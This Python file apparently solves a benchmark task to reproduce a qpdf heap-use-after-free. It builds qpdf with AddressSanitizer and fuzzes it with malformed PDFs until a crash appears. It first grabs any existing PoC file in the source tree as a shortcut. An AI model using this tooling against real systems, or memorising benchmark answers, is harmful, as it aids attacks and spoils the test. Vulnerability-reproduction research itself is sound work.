import os
import tarfile
import tempfile
import subprocess
import random
import time
import shutil
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmp_root = tempfile.mkdtemp(prefix="qpdf_poc_")
        try:
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    tf.extractall(tmp_root)
            except Exception:
                # If extraction fails, just return a static PoC
                return self._generate_pdf(0)

            project_dir = self._find_project_dir(tmp_root)

            # Try to find existing PoC or regression test in the source tree
            existing = self._search_existing_poc(project_dir)
            if existing is not None:
                return existing

            # Try dynamic build + fuzzing
            poc = self._build_and_fuzz(project_dir, global_time_budget=420.0)
            if poc is not None:
                return poc

        except Exception:
            # On any error, fall back to static PoC
            pass
        finally:
            # Best effort cleanup
            try:
                shutil.rmtree(tmp_root, ignore_errors=True)
            except Exception:
                pass

        return self._generate_pdf(0)

    # ------------------ Helper methods ------------------

    def _find_project_dir(self, root: str) -> str:
        # Prefer a single top-level directory if present
        try:
            entries = [os.path.join(root, e) for e in os.listdir(root)]
        except Exception:
            return root

        top_dirs = [e for e in entries if os.path.isdir(e)]
        if len(top_dirs) == 1:
            candidate = top_dirs[0]
            if self._has_build_files(candidate):
                return candidate

        if self._has_build_files(root):
            return root

        # Look one level down for a directory with build files
        for d in top_dirs:
            if self._has_build_files(d):
                return d

        return root

    def _has_build_files(self, d: str) -> bool:
        return (
            os.path.exists(os.path.join(d, "configure"))
            or os.path.exists(os.path.join(d, "CMakeLists.txt"))
        )

    def _search_existing_poc(self, root: str) -> Optional[bytes]:
        keywords = [
            "42535152",
            "heap-use-after-free",
            "heap_use_after_free",
            "use-after-free",
            "uaf",
            "oss-fuzz",
        ]
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                lower = fn.lower()
                if any(k in lower for k in keywords):
                    path = os.path.join(dirpath, fn)
                    try:
                        if os.path.getsize(path) > 0:
                            with open(path, "rb") as f:
                                data = f.read()
                                if data:
                                    return data
                    except Exception:
                        continue
        return None

    def _build_and_fuzz(self, project_dir: str, global_time_budget: float) -> Optional[bytes]:
        start = time.time()

        use_configure = os.path.exists(os.path.join(project_dir, "configure"))
        use_cmake = os.path.exists(os.path.join(project_dir, "CMakeLists.txt")) and not use_configure

        if not use_configure and not use_cmake:
            return None

        env = os.environ.copy()
        san_flags = "-g -O1 -fsanitize=address"
        for key in ("CFLAGS", "CXXFLAGS"):
            env[key] = (env.get(key, "") + " " + san_flags).strip()
        env["LDFLAGS"] = (env.get("LDFLAGS", "") + " -fsanitize=address").strip()

        try:
            if use_configure:
                if not os.path.exists(os.path.join(project_dir, "Makefile")):
                    self._run_cmd(
                        ["./configure"],
                        cwd=project_dir,
                        env=env,
                        timeout=min(300, int(global_time_budget)),
                    )
                try:
                    self._run_cmd(
                        ["make", "-j", "8", "qpdf"],
                        cwd=project_dir,
                        env=env,
                        timeout=min(600, int(global_time_budget)),
                    )
                except Exception:
                    self._run_cmd(
                        ["make", "-j", "8"],
                        cwd=project_dir,
                        env=env,
                        timeout=min(600, int(global_time_budget)),
                    )
                build_root_for_search = project_dir
            else:
                build_dir = os.path.join(project_dir, "build_poc")
                os.makedirs(build_dir, exist_ok=True)
                cmake_cmd = [
                    "cmake",
                    "..",
                    "-DCMAKE_BUILD_TYPE=RelWithDebInfo",
                    f"-DCMAKE_C_FLAGS={san_flags}",
                    f"-DCMAKE_CXX_FLAGS={san_flags}",
                    "-DCMAKE_EXE_LINKER_FLAGS=-fsanitize=address",
                    "-DCMAKE_SHARED_LINKER_FLAGS=-fsanitize=address",
                ]
                self._run_cmd(
                    cmake_cmd,
                    cwd=build_dir,
                    env=env,
                    timeout=min(300, int(global_time_budget)),
                )
                self._run_cmd(
                    ["cmake", "--build", ".", "-j", "8"],
                    cwd=build_dir,
                    env=env,
                    timeout=min(600, int(global_time_budget)),
                )
                build_root_for_search = build_dir
        except Exception:
            return None

        # Find qpdf executable in build tree
        qpdf_path = self._find_executable(build_root_for_search, "qpdf")
        if not qpdf_path:
            # As a fallback, search entire project_dir tree
            qpdf_path = self._find_executable(project_dir, "qpdf")
        if not qpdf_path:
            return None

        # Fuzzing loop: generate suspicious PDFs and run qpdf
        max_trials = 200
        rng = random.Random(123456)

        for i in range(max_trials):
            if time.time() - start > global_time_budget:
                break

            seed = rng.randint(0, 1_000_000)
            pdf_bytes = self._generate_pdf(seed)

            input_path = os.path.join(build_root_for_search, f"poc_input_{i}.pdf")
            output_path = os.path.join(build_root_for_search, f"poc_output_{i}.pdf")

            try:
                with open(input_path, "wb") as f:
                    f.write(pdf_bytes)
            except Exception:
                continue

            try:
                if self._run_qpdf(qpdf_path, input_path, output_path):
                    return pdf_bytes
            except Exception:
                # Ignore individual run failures and continue fuzzing
                continue

        return None

    def _run_cmd(self, cmd, cwd: str, env, timeout: int):
        subprocess.run(
            cmd,
            cwd=cwd,
            env=env,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=timeout,
            check=True,
        )

    def _find_executable(self, root: str, name: str) -> Optional[str]:
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if fn == name:
                    path = os.path.join(dirpath, fn)
                    if os.path.isfile(path) and os.access(path, os.X_OK):
                        return path
        return None

    def _run_qpdf(self, qpdf_path: str, in_path: str, out_path: str) -> bool:
        # Run qpdf with object streams preserved to exercise QPDFWriter::preserveObjectStreams
        cmd = [qpdf_path, "--object-streams=preserve", in_path, out_path]
        proc = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd=os.path.dirname(qpdf_path),
            timeout=20,
        )
        if proc.returncode == 0:
            return False
        stderr_text = proc.stderr.decode("latin1", errors="ignore")
        if "AddressSanitizer" in stderr_text or "heap-use-after-free" in stderr_text:
            return True
        return False

    # ------------------ PDF generator ------------------

    def _generate_pdf(self, seed: int) -> bytes:
        rnd = random.Random(seed)

        lines = []
        lines.append("%PDF-1.7")
        # Binary comment line to make file look more realistic
        lines.append("%\xE2\xE3\xCF\xD3")

        # Core minimal structure
        lines.append("1 0 obj")
        lines.append("<< /Type /Catalog /Pages 2 0 R >>")
        lines.append("endobj")

        lines.append("2 0 obj")
        lines.append("<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        lines.append("endobj")

        lines.append("3 0 obj")
        lines.append(
            "<< /Type /Page /Parent 2 0 R "
            "/MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>"
        )
        lines.append("endobj")

        # Content stream
        content_stream = "BT /F1 24 Tf 100 700 Td (Hello UAF) Tj ET"
        lines.append("4 0 obj")
        lines.append(f"<< /Length {len(content_stream)} >>")
        lines.append("stream")
        lines.append(content_stream)
        lines.append("endstream")
        lines.append("endobj")

        # Base font object
        lines.append("5 0 obj")
        lines.append("<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>")
        lines.append("endobj")

        # Create multiple duplicate definitions for object 5 0
        dupe_count = rnd.randint(3, 12)
        for i in range(dupe_count):
            lines.append("5 0 obj")
            rand_key = f"/Random{chr(65 + (i % 26))}"
            rand_val = rnd.randint(-1000, 1000)
            lines.append(f"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica {rand_key} {rand_val} >>")
            lines.append("endobj")

        # Additional indirect objects, some with multiple variants
        max_obj = 15
        for obj_num in range(6, max_obj + 1):
            variants = rnd.randint(1, 4)
            for v in range(variants):
                lines.append(f"{obj_num} 0 obj")
                entries = []
                num_entries = rnd.randint(1, 4)
                for _ in range(num_entries):
                    key = f"/K{rnd.randint(0, 999)}"
                    choice = rnd.randint(0, 2)
                    if choice == 0:
                        val = str(rnd.randint(-5000, 5000))
                    elif choice == 1:
                        val = f"/Name{rnd.randint(0, 99)}"
                    else:
                        ref_obj = rnd.randint(1, max_obj)
                        val = f"{ref_obj} 0 R"
                    entries.append(f"{key} {val}")
                body = "<< " + " ".join(entries) + " >>"
                lines.append(body)
                lines.append("endobj")

        # Object streams with duplicated object ids inside
        num_objstms = 3
        next_objstm_num = max_obj + 1
        for s in range(num_objstms):
            N = rnd.randint(3, 8)
            inner_ids = [rnd.randint(4, max_obj) for _ in range(N)]
            if N >= 3:
                # Force at least one duplicate id in each stream
                inner_ids[0] = inner_ids[-1]

            header_parts = []
            offset = 0
            object_bodies = []
            for oid in inner_ids:
                header_parts.append(f"{oid} {offset}")
                num_entries = rnd.randint(1, 4)
                entries = []
                for _ in range(num_entries):
                    key = f"/I{rnd.randint(0, 999)}"
                    val_type = rnd.randint(0, 2)
                    if val_type == 0:
                        val = str(rnd.randint(-9999, 9999))
                    elif val_type == 1:
                        val = f"/Inner{rnd.randint(0, 99)}"
                    else:
                        ref = rnd.randint(1, max_obj)
                        val = f"{ref} 0 R"
                    entries.append(f"{key} {val}")
                inner_body = "<< " + " ".join(entries) + " >>"
                obj_text = inner_body + "\n"
                object_bodies.append(obj_text)
                offset += len(obj_text.encode("latin1"))

            header_str = " ".join(header_parts) + "\n"
            body_str = header_str + "".join(object_bodies)
            first = len(header_str.encode("latin1"))
            length = len(body_str.encode("latin1"))

            lines.append(f"{next_objstm_num} 0 obj")
            lines.append(f"<< /Type /ObjStm /N {N} /First {first} /Length {length} >>")
            lines.append("stream")
            lines.append(body_str.rstrip("\n"))
            lines.append("endstream")
            lines.append("endobj")
            next_objstm_num += 1

        # Additional duplicates of random object numbers to ensure multiple entries
        for dup in range(3):
            obj_num = rnd.randint(4, max_obj)
            lines.append(f"{obj_num} 0 obj")
            lines.append(f"<< /Duplicate {dup} /Seed {seed} >>")
            lines.append("endobj")

        # Final trailer without xref to force xref reconstruction
        lines.append("trailer")
        lines.append("<< /Root 1 0 R >>")
        lines.append("%%EOF")

        pdf_str = "\n".join(lines) + "\n"
        return pdf_str.encode("latin1", "replace")